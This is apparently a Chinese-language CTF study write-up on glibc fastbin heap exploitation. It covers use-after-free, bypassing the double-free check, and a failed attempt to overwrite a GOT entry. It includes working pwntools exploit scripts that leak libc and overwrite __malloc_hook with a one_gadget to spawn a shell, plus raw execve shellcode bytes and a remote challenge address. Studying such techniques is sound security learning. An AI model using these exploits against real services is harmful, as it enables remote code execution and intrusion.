system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()

print "system --->" + hex(system) + '\n'
print "binsh --->" + hex(binsh) + '\n'

#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------

one_gadget = libc_base + 0xf1207
print "one_gadget --->" + hex(one_gadget) + '\n'

malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
print "malloc_hook --->" + hex(malloc_hook)
print "realloc --->" + hex(realloc)
fake_chunk = malloc_hook - 0x23
print "fake_chunk ---> " + hex(fake_chunk)

add(2,0x68)
free(2)
edit(2,0x8,p64(fake_chunk))

add(3,0x68)
add(4,0x68)

py = ''
#py += 'a'*0x23 + p64(one_gadget) + '\n'
py+= 'a'*11 + p64(one_gadget) + p64(realloc+2) + '\n'
print py + '\n'
edit(4,0x40,py)

debug(0x400AD2,0)

add(5,0x68)

p.interactive()
                             
```



#### double free



同一个堆块，如果连续free两次，会报错。


![upload successful](/images/pasted-119.png)



源码

```c
if (__builtin_expect (old == p, 0))
 { errstr = "double free or corruption (fasttop)"; 
goto errout; }

```

old是上次free的堆块，p是这次free的。如果连个相等，则报错。所以绕过机制为：在两次free中间夹一次free其它堆块。



```python
add(0,0x68)
add(1,0x68)

free(0)
free(1)
free(0)
```



【10.28看到这里啦】



free掉1号块之后

![upload successful](/images/pasted-120.png)

两个堆块都是free状态


![upload successful](/images/pasted-121.png)


再次free(0)，可以看到两个堆块相互指着


![upload successful](/images/pasted-122.png)

堆块的使用状态如下

![upload successful](/images/pasted-123.png)

如果此时再分别add两个堆块2，3号。



add 2号堆块之后，把原来的0x603000，即0号堆块分配给了2号。


![upload successful](/images/pasted-124.png)
telescope可验证如下

![upload successful](/images/pasted-125.png)

再add 3号块

![upload successful](/images/pasted-126.png)

![upload successful](/images/pasted-127.png)


再次add许多堆块，发现不管add多少，都只是在这些0，1两个堆块之间反复申请。

![upload successful](/images/pasted-128.png)


对于刚才add的2号块，已知分配给它的是free掉的0号块。如果edit，即可以修改其fd处的值。

```python
add(2,0x68)
edit(2,0x8,'bbbbbbbb')
```


![upload successful](/images/pasted-129.png)


![upload successful](/images/pasted-130.png)


如果此时再申请两次，把fastbins里的3070和3000申请走，就会只剩下‘bbbb’


![upload successful](/images/pasted-131.png)


![upload successful](/images/pasted-132.png)



此时2号块和4号块其实是同一个块，修改其中一个，另一个也会改变。



**危害原理：**通过修改free状态的堆块的fd指针，造成指针的指向改变(指向任意想要指向的地方)，达到攻击目的，俗称**fastbin attack**



使用前提是必须有**uaf**。



还有一个使用的隐形前提是：fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空，所以会被认为是使用状态，所以下次free的时候，还是可以free的。

![upload successful](/images/pasted-133.png)

这里71中的1表示 前一个堆块被使用。



已知double free可以修改指针，那么如果能泄漏地址，可以造成和uaf同样的效果。不同的地方是：uaf需要多add几次，才能申请到我们想要的堆块。

【经提示，uaf是漏洞类型，uaf是漏洞的利用方式 】



exp如下：

```python 
add(0,0x108)
add(1,0x108)
add(2,0x108)

free(0)

show(0)
ru("Content: ")
libc_base = u64(rc(6).ljust(8,'\x00')) - 0x3c4b78
print "libc_base --->" + hex(libc_base) + '\n'

system = libc_base + libc.sym["system"]
binsh = libc_base + libc.search('/bin/sh').next()

print "system --->" + hex(system) + '\n'
print "binsh --->" + hex(binsh) + '\n'

#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------

one_gadget = libc_base + 0xf1207
print "one_gadget --->" + hex(one_gadget) + '\n'

malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
print "malloc_hook --->" + hex(malloc_hook)
print "realloc --->" + hex(realloc)
fake_chunk = malloc_hook - 0x23
print "fake_chunk ---> " + hex(fake_chunk)

add(3,0x68)
add(4,0x68)

free(3)
free(4)
free(3)

add(5,0x68)
edit(5,0x8,p64(fake_chunk))
add(6,0x68)
add(7,0x68)
add(8,0x68)

py = ''
#py += 'a'*0x23 + p64(one_gadget) + '\n'
py+= 'a'*11 + p64(one_gadget) + p64(realloc+2) + '\n'
print py + '\n'

add(9,0x68)

p.interactive()
```



一个其它的小技巧，可以不用fake_chunk，而用stack的地址，也可以尝试修改got表。


![upload successful](/images/pasted-135.png)


如下显示使用got表。

ida中查看got表的地址


![upload successful](/images/pasted-136.png)


![upload successful](/images/pasted-137.png)

所以fake_chunk可以不用上面的那个，即我们自己找到了一个faku_chunk，大小为0x60。

在申请的时候需要再申请的大小是0x58

```python
fake_chunk2 = 0x601ffa

add(3,0x58)
add(4,0x58)

free(3)
free(4)
free(3)

add(5,0x58)
edit(5,0x8,p64(fake_chunk2))

```

![upload successful](/images/pasted-138.png)


再次add

```python
add(6,0x58)
add(7,0x58)
add(8,0x58)
```

![upload successful](/images/pasted-139.png)

可以看出，在申请第8块的时候，申请到了got表的内容。可以往8号块写入内容。

```python
edit(8,0x20,'a'*0x20)
```

这时报错，可能是因为got表错误，导致程序错误。

不修改8个字节，修改3个字节尝试。

![upload successful](/images/pasted-140.png)


![upload successful](/images/pasted-141.png)



查看上图发现，got表中有free()，我们可以把它改为system。payload如下

```python
py = 'a'*14 + p64(system)
edit(8,len(py),py)
```

填入'a'报错，填入'\x00'，也报错。可能是改变了中间的有意义的值。

![upload successful](/images/pasted-142.png)

由于写是从0x60200a开始写到，先保持地址0x7ffff7ffe168不变。

```python
mm = 0x7ffff7ff
py = p64(mm) + 'a'*6 + p64(system) + '\n'
edit(8,len(py),py)
```

![upload successful](/images/pasted-143.png)

可以看到free被改成了system，并且保持了原来的一部分正确。

但是！发现还是不可以的。

下面保持原来下一个_dl_runtime_resolve_xsave也是不变的，即0x7ffff7deee40不变。

```python
mm = 0x7ffff7ff
#4byte

dll = 0x7ffff7deee40
#6byte

py = '\xff\xf7\xff\x7f' + '\x00\x00' +p64(dll) + p64(system) + '\n'
debug(0x400CCA,0)
edit(8,len(py),py)

```


![upload successful](/images/pasted-144.png)


将1号块写入/bin/sh，然后free(1)

断点设置在free处


![upload successful](/images/pasted-145.png)

```python
edit(8,len(py),py)
edit(1,8,'/bin/sh\x00')
free(1)
debug(0x400B94,0)
```

此时如果前面的都正确，然后去free一个有/bin/sh的堆块，就会getshell。

但是还是报错了。


![upload successful](/images/pasted-146.png)


思路就是这样，但是这道利用不了，掌握这个方法就ok。亦已焉哉～



同样的思路，size的地址部分也有一个0xXX的值，用同样的方法利用。

![upload successful](/images/pasted-147.png)


![upload successful](/images/pasted-148.png)

可以再申请一个堆块，大小为0x61，这里申请大小为0x61，存入的就是0x61,存入的值是没有加size头的。但是在再次申请的时候需要考虑size头。

先把堆块的size构造入下

![upload successful](/images/pasted-149.png)


```python
add(8,0x58)
edit(8,8,p64(fake_chunk2))
```


![upload successful](/images/pasted-150.png)



然后再多次add，申请到相应的堆块之后，就可以edit修改size的值。

然后后面就可以再配合其它的攻击手法进行利用。



**练习2: pwn2做题记录**

malloc中填入的内容，被写在堆块的fd指针中。



![upload successful](/images/pasted-151.png)


在每个堆块前都有一个大小为33的堆块，fd的值是我们要申请的堆块的大小，bk的值是申请到的堆块的地址+0x10。堆块的name从fd的位置开始写。



泄漏出基地值是0x...a0d000

![upload successful](/images/pasted-152.png)



申请6号块的时候，把fake_chunk的地址写入到原来的1号块中。


![upload successful](/images/pasted-153.png)


![upload successful](/images/pasted-154.png)

再次多次申请，到相应的块之后，用realloc+one_gadget进行利用。

本题还设置了一个chunk头，所以我们在free的时候要多free一个4号块，让他占据chunk头的位置。


![upload successful](/images/pasted-155.png)

利用完后，应该是修改了某部分，不能再利用我们原来写的交互中的malloc函数来进行利用了，需要再写一个交互过程的语句。完成！！！

![upload successful](/images/pasted-156.png)
完整的payload如下

```python
# -*- coding: utf-8 -*-
from pwn import *
#from libformatstr import FormatStr
context.log_level = 'debug'
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pwn2')
if local:
    p = process('./pwn2')
    libc = elf.libc
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#onegadget64(libc.so.6)
# one = [0x45216,0x4526a,0xf02a4,0xf1147]
# [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]
#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
# py32 = fmtstr_payload(start_read_offset,{xxx_got:system_addr})
# sl(py32)
# py64 = FormatStr(isx64=1)
# py64[printf_got] = onegadget
# sl(py64.payload(start_read_offset))
shellcode = asm(shellcraft.sh())
shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80'
#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
# libc.address = libc_addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

def malloc(index,size,content):
        ru("Your Choice")
        sl('1')
        ru("index>> ")
        sl(str(index))
        ru("size>> ")
        sl(str(size))
        ru("name>> ")
        sd(content)
def free(index):
        ru("Your Choice")
        sl('2')
        ru("index>> ")
        sl(str(index))
def edit(index,content):
        ru("Your Choice")
        sl('3')
        ru("index>> ")
        sl(str(index))
        ru("name>> ")
        sd(content)
def show(index):
        ru("Your Choice")
        sl('5')
        ru("index>> ")
        sl(str(index))

malloc(0,0x100,'aaaa')
malloc(1,0x68,'bbbb')
malloc(2,0x68,'bbbb')
malloc(3,0x78,'bbbb')
malloc(4,0x100,'a')
malloc(5,0x100,'a')
free(0)
show(0)
addr = u64(rc(6).ljust(8,'\x00'))-0x3c4b78
print "addr--->"+hex(addr)
malloc_hook = addr + libc.sym["__malloc_hook"]
fake_chunk = malloc_hook-0x23
onegadget = addr + 0x4527a
realloc = addr + libc.sym['realloc']
print "fake_chunk--->" + hex(fake_chunk)
print "onegadget--->" + hex(onegadget)
print "realloc--->" + hex(realloc)

free(1)
free(2)
free(1)
free(4)
malloc(6,0x68,p64(fake_chunk))
malloc(7,0x68,p64(fake_chunk))
malloc(8,0x68,p64(fake_chunk))
malloc(9,0x68,'a'*11+p64(onegadget)+p64(realloc))
ru("Your Choice")
sl('1')
ru("index>> ")
sl(str(10))
ru("size>> ")
p.interactive()

```



### 资源

1、libc 

http://ftp.gnu.org/gnu/glibc/